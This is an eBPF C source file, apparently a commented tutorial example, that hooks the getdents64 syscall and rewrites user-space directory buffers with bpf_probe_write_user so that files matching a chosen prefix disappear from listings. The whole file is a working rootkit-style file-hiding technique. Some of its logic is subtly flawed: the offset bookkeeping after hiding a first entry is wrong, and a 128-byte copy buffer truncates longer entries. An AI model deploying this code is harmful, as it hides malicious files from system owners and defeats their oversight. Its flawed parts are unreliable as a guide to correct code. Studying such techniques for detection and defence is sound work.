// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)
/* 24-hide: hide files from directory listings by rewriting getdents64 output.
 *
 * On sys_enter_getdents64, save the dirent buffer pointer keyed by pid.  On
 * sys_exit_getdents64, walk the returned buffer.  For entries whose name
 * matches the target prefix, remove them from the listing.
 *
 * 隐藏策略（两种情况）：
 * 1. 非首条目匹配：把前一个条目的 d_reclen 加上当前条目的 d_reclen，
 *    使消费方（ls 等）跳过被隐藏的条目。
 * 2. 首条目匹配：把下一个条目的数据复制到当前位置，并将 d_reclen
 *    设为两个条目之和，然后跳过下一个条目。
 *
 * linux_dirent64 结构：
 *   u64 d_ino;          // 偏移 0:  inode 号
 *   s64 d_off;          // 偏移 8:  到下一个条目的偏移
 *   u16 d_reclen;       // 偏移 16: 本条目总长度
 *   u8  d_type;         // 偏移 18: 文件类型
 *   char d_name[];      // 偏移 19: 文件名（柔性数组）
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

#define MAX_DIRENT_COUNT 256
#define D_RECLEN_OFFSET  16
#define D_NAME_OFFSET    19
#define COPY_BUF_SIZE    128

const volatile int target_strlen = 0;
const char target_name[16] = {};

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, u32);
	__type(value, void*);
} dirent_map SEC(".maps");

SEC("tp/syscalls/sys_enter_getdents64")
int handle_enter(struct trace_event_raw_sys_enter *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void *dirent = (void *)ctx->args[1];
	bpf_map_update_elem(&dirent_map, &pid, &dirent, BPF_ANY);
	return 0;
}

/*
 * sys_exit_getdents64 tracepoint 回调
 *
 * getdents64 系统调用返回后触发。此时内核已经把目录条目写入用户态
 * 缓冲区（dirent），返回值 ret 是写入的总字节数。我们遍历这个缓冲区，
 * 对匹配目标前缀的条目进行隐藏处理。
 *
 * 缓冲区中是一系列连续的 linux_dirent64 结构，每个的长度由 d_reclen
 * 字段决定。遍历方式：从 pos=0 开始，每次 pos += d_reclen。
 *
 * 隐藏原理：
 *   getdents64 的消费方（ls 等）按 d_reclen 逐条读取目录条目。
 *   如果我们把"前一个条目"的 d_reclen 加上"被隐藏条目"的 d_reclen，
 *   消费方就会跳过被隐藏的条目，直接看到后面的条目。
 *
 *   图示（非首条目情况）：
 *   修改前: [条目A reclen=32][条目B reclen=32(隐藏)][条目C reclen=24]
 *   修改后: [条目A reclen=64           ][条目C reclen=24]
 *                                  ↑ B 被跳过
 *
 *   首条目情况（没有前一个条目可合并）：
 *   修改前: [条目A reclen=32(隐藏)][条目B reclen=32][条目C reclen=24]
 *   修改后: [条目B reclen=64           ][条目C reclen=24]
 *   把 B 的数据复制到 A 的位置，reclen 设为 A+B 之和。
 *
 * @ctx  tracepoint 上下文，ctx->ret 是 getdents64 的返回值（字节数）
 */
SEC("tp/syscalls/sys_exit_getdents64")
int handle_exit(struct trace_event_raw_sys_exit *ctx)
{
	/* 用 tgid（线程组ID，即用户态的 PID）作为 hash map 的 key。
	 * bpf_get_current_pid_tgid 返回 (tgid << 32) | tid，
	 * 右移 32 位取高 32 位得到 tgid。 */
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void **direntp, *dirent;
	int ret = (int)ctx->ret;       /* getdents64 返回的字节数 */
	char name[16], tmp[16];        /* name: 读到的文件名; tmp: 目标前缀 */
	long pos = 0;                  /* 当前遍历位置在缓冲区中的偏移（字节） */
	__u16 prev_reclen_off = 0;     /* 前一个未隐藏条目的 d_reclen 字段在缓冲区中的偏移 */
	bool has_prev = false;         /* 是否已经有未隐藏的前一个条目 */
	int i;

	/* 返回值 <= 0 表示出错或没有数据，无需处理 */
	if (ret <= 0)
		goto out;

	/* 从 hash map 中取出 enter 阶段保存的 dirent 缓冲区指针 */
	direntp = bpf_map_lookup_elem(&dirent_map, &pid);
	if (!direntp)
		return 0;  /* 没有 enter 记录（可能是别的进程），跳过 */
	dirent = *direntp;

	/* 检查目标前缀是否有效 */
	if (target_strlen <= 0 || target_strlen > 16)
		goto out;

	/* 从 rodata（只读数据段）读取目标前缀到栈上变量 tmp。
	 * rodata 由用户态在 load 前通过 skel->rodata->target_name 设置。 */
	bpf_probe_read_kernel(tmp, target_strlen, target_name);

	/* ── 遍历 dirent 缓冲区 ──
	 * #pragma unroll 提示编译器展开循环（但 verifier 仍需要确定上界）。
	 * MAX_DIRENT_COUNT=256 是循环上界，足够覆盖绝大多数目录。
	 * 循环内通过 break 提前退出（pos >= ret 或读取失败时）。 */
#pragma unroll
	for (i = 0; i < MAX_DIRENT_COUNT; i++) {
		__u16 d_reclen;  /* 当前条目的总长度（字节） */

		/* pos 超出返回数据范围 → 遍历结束 */
		if (pos >= ret)
			break;

		/* 从用户态缓冲区读取当前条目的 d_reclen 字段。
		 * d_reclen 位于 linux_dirent64 偏移 16，2 字节。
		 * bpf_probe_read_user：从用户态地址安全读取（不会因缺页崩溃）。 */
		if (bpf_probe_read_user(&d_reclen, sizeof(d_reclen),
					(void *)(dirent + pos + D_RECLEN_OFFSET)))
			break;  /* 读取失败，停止遍历 */

		/* d_reclen=0 是异常值；pos + d_reclen 超过 ret 说明条目不完整 */
		if (d_reclen == 0 || pos + d_reclen > ret)
			break;

		/* 读取文件名：d_name 位于偏移 19，是变长字符串（柔性数组 char[]）。
		 * bpf_probe_read_user_str：从用户态地址读取以 \0 结尾的字符串，
		 * 最多读 sizeof(name)=16 字节（含 \0）。 */
		bpf_probe_read_user_str(name, sizeof(name),
					(void *)(dirent + pos + D_NAME_OFFSET));

		/* ── 文件名前缀匹配 ──
		 * 逐字节比较 name 和 tmp 的前 target_strlen 个字符。 */
		bool match = true;
		for (int j = 0; j < 16; j++) {
			if (j >= target_strlen)
				break;  /* 比较完目标长度，匹配成功 */
			if (name[j] != tmp[j]) { match = false; break; }
		}

		if (match) {
			if (has_prev) {
				/* ── 情况 1：非首条目 — 合并到前一个条目 ──
				 * 把前一个未隐藏条目的 d_reclen 加上当前条目的 d_reclen，
				 * 使消费方跳过被隐藏的条目。
				 *
				 * 例如：前条目 reclen=32，当前 reclen=32 → 新 reclen=64
				 * 消费方读到前条目时，按 reclen=64 跳过，直接看到下一个。 */
				__u16 prev_reclen, new_reclen;

				/* 读取前一个条目当前的 d_reclen */
				if (bpf_probe_read_user(&prev_reclen, sizeof(prev_reclen),
							(void *)(dirent + prev_reclen_off)))
					goto next;  /* 读取失败，跳过此条目 */

				/* 新 reclen = 前条目 reclen + 被隐藏条目 reclen */
				new_reclen = prev_reclen + d_reclen;

				/* 写回前一个条目的 d_reclen 字段。
				 * bpf_probe_write_user：向用户态地址写入数据。
				 * 这是 BPF 最危险的 helper 之一，需要 CAP_SYSADMIN。 */
				bpf_probe_write_user(
					(void *)(dirent + prev_reclen_off),
					&new_reclen, sizeof(new_reclen));

				/* 注意：不更新 prev_reclen_off 和 has_prev，
				 * 因为被隐藏条目不会成为"前一个条目"。 */
			} else {
				/* ── 情况 2：首条目 — 把下一个条目复制到当前位置 ──
				 * 当被隐藏的条目是缓冲区中的第一个条目时，没有"前一个条目"
				 * 可以合并。此时把下一个条目的数据覆盖到当前位置，
				 * 并把 d_reclen 设为两个条目之和。
				 *
				 * 例如：
				 *   修改前: [A(隐藏) reclen=32][B reclen=32][C reclen=24]
				 *   修改后: [B的数据    reclen=64][C reclen=24]
				 *   消费方读到 B 的内容，按 reclen=64 跳过 A 的空间。 */
				long next_pos = pos + d_reclen;
				__u16 next_reclen;

				/* 下一个条目超出缓冲区范围，无法复制 */
				if (next_pos >= ret)
					goto next;

				/* 读取下一个条目的 d_reclen */
				if (bpf_probe_read_user(&next_reclen, sizeof(next_reclen),
							(void *)(dirent + next_pos + D_RECLEN_OFFSET)))
					goto next;
				if (next_reclen == 0 || next_pos + next_reclen > ret)
					goto next;

				/* 把下一个条目的完整数据复制到当前位置。
				 * 使用栈上的 copy_buf 作为中转（BPF 不能直接做内存到内存拷贝）。
				 * COPY_BUF_SIZE=128 足够覆盖单个 dirent 条目
				 * （最大文件名 255 + 头部 19 = 274，但 128 已覆盖常见情况）。 */
				__u8 copy_buf[COPY_BUF_SIZE];
				__u16 copy_len = next_reclen;
				if (copy_len > COPY_BUF_SIZE)
					copy_len = COPY_BUF_SIZE;  /* 截断到缓冲区大小 */

				/* 从用户态读取下一个条目的数据到栈缓冲区 */
				if (bpf_probe_read_user(copy_buf, copy_len,
							(void *)(dirent + next_pos)))
					goto next;

				/* 把栈缓冲区的数据写回用户态的当前位置 */
				bpf_probe_write_user(
					(void *)(dirent + pos),
					copy_buf, copy_len);

				/* 将当前位置的 d_reclen 设为两个条目之和，
				 * 这样消费方会跳过被隐藏条目占用的空间。 */
				__u16 merged_reclen = d_reclen + next_reclen;
				bpf_probe_write_user(
					(void *)(dirent + pos + D_RECLEN_OFFSET),
					&merged_reclen, sizeof(merged_reclen));

				/* 跳过两个条目（被隐藏的 + 被复制过来的），
				 * 因为当前位置已经是下一个条目的数据了。 */
				pos += d_reclen + next_reclen;
				/* 当前位置（复制后的条目）成为"前一个条目" */
				prev_reclen_off = pos + D_RECLEN_OFFSET;
				has_prev = true;
				continue;  /* 不执行底部的 pos += d_reclen */
			}
		} else {
			/* ── 不匹配：当前条目不隐藏 ──
			 * 记录它的 d_reclen 字段偏移，作为下一轮的"前一个条目"。 */
			prev_reclen_off = pos + D_RECLEN_OFFSET;
			has_prev = true;
		}

next:
		/* 移动到下一个条目 */
		pos += d_reclen;
	}

out:
	/* 清理 hash map 中此 pid 的记录，避免内存泄漏 */
	bpf_map_delete_elem(&dirent_map, &pid);
	return 0;
}
